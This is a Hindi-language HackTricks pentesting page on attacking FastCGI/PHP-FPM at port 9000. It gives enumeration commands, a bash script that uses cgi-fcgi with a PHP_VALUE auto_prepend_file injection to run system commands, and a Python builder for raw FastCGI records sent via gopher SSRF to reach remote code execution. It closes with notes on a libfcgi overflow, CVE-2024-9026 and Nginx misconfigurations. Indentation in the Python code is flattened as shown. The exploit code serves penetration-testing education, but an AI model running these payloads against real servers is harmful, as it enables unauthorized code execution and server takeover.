# 9000 Pentesting FastCGI

{{#include ../banners/hacktricks-training.md}}

## बुनियादी जानकारी

यदि आप यह जानना चाहते हैं कि **FastCGI क्या है** तो निम्न पृष्ठ देखें:


{{#ref}}
pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi.md
{{#endref}}

डिफ़ॉल्ट रूप से **FastCGI** **port** **9000** पर चलता है और इसे nmap द्वारा पहचाना नहीं जाता है। **अक्सर** **FastCGI** केवल **localhost** पर ही listen करता है।

## सूचीकरण / त्वरित जाँच

* **Port scan:** `nmap -sV -p9000 <target>` (अक्सर "unknown" service दिखाएगा; मैन्युअल रूप से जांचें).
* **Probe FPM status page:** `SCRIPT_FILENAME=/status SCRIPT_NAME=/status REQUEST_METHOD=GET cgi-fcgi -bind -connect 127.0.0.1:9000` (default php-fpm `pm.status_path`).
* **Find reachable sockets via SSRF:** यदि कोई HTTP सेवा SSRF के लिए exploitable है, तो FastCGI listener को हिट करने के लिए `gopher://127.0.0.1:9000/_...` payloads आज़माएँ।
* **Nginx misconfigs:** यदि `cgi.fix_pathinfo=1` और `fastcgi_split_path_info` में errors हों, तो आप static files में `/.php` जोड़कर PHP तक पहुँच सकते हैं (code exec via traversal).

## RCE

FastCGI से arbitrary code execute कराना काफी आसान है:

<details>
<summary>ऐसा FastCGI request भेजें जो PHP payload को prepend करे</summary>
```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/public/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
OUTPUT=$(mktemp)
env -i \
PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

cat $OUTPUT
done
```
</details>

या आप निम्नलिखित python script का उपयोग भी कर सकते हैं: [https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75)

### SSRF/gopher to FastCGI (जब 9000 सीधे पहुँच योग्य नहीं हो)

यदि आप केवल एक **SSRF** primitive को नियंत्रित करते हैं, तो आप gopher scheme का उपयोग करके फिर भी FastCGI को हिट कर सकते हैं और एक पूरा FastCGI request तैयार कर सकते हैं। उदाहरण payload builder:

<details>
<summary>एक gopher FastCGI RCE payload बनाएँ और भेजें</summary>
```python
import struct, socket
host, port = "127.0.0.1", 9000
params = {
b"REQUEST_METHOD": b"POST",
b"SCRIPT_FILENAME": b"/var/www/html/index.php",
b"PHP_VALUE": b"auto_prepend_file=php://input\nallow_url_include=1"
}
body = b"<?php system('id'); ?>"

def rec(rec_type, content, req_id=1):
return struct.pack("!BBHHBB", 1, rec_type, req_id, len(content), 0, 0) + content

def enc_params(d):
out = b""
for k, v in d.items():
out += struct.pack("!B", len(k)) + struct.pack("!B", len(v)) + k + v
return out
payload  = rec(4, enc_params(params)) + rec(4, b"")  # FCGI_PARAMS + terminator
payload += rec(5, body)                                # FCGI_STDIN

s = socket.create_connection((host, port))
s.sendall(payload)
print(s.recv(4096))
```
अपने SSRF में `payload` को URL-safe base64/percent-encoding में कनवर्ट करें और उसे `gopher://host:9000/_<payload>` के माध्यम से भेजें।
</details>

### हाल के मुद्दों पर नोट्स

* **libfcgi <= 2.4.4 integer overflow (2024):** FastCGI रिकॉर्ड्स में निर्मित `nameLen`/`valueLen` 32‑bit builds (common in embedded/IoT) पर overflow कर सकते हैं, जिससे जब FastCGI socket पहुँच योग्य हो (सीधे या SSRF के माध्यम से) तो heap RCE हो सकता है।
* **PHP-FPM log manipulation (CVE-2024-9026):** जब `catch_workers_output = yes` होता है, तो FastCGI requests भेजने में सक्षम हमलावर प्रति लॉग लाइन अधिकतम 4 bytes तक truncate या inject कर सकते हैं ताकि संकेत मिटाए जा सकें या logs poison किए जा सकें।
* **Classic Nginx + cgi.fix_pathinfo misconfig:** यह अभी भी व्यापक रूप से देखा जाता है; अगर `fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;` का उपयोग file existence checks के बिना किया जाता है, तो किसी भी path जो `.php` पर समाप्त होता है execute हो जाता है, जिससे path traversal या source overwrite style gadgets सक्षम होते हैं।

## संदर्भ

* [FastCGI library integer overflow leading to RCE](https://cybersecuritynews.com/fastcgi-integer-overflow-flaw/)
* [CVE-2024-9026 PHP-FPM log manipulation analysis](https://cyrisk.com/security/cve-2024-9026-log-manipulation/)
{{#include ../banners/hacktricks-training.md}}
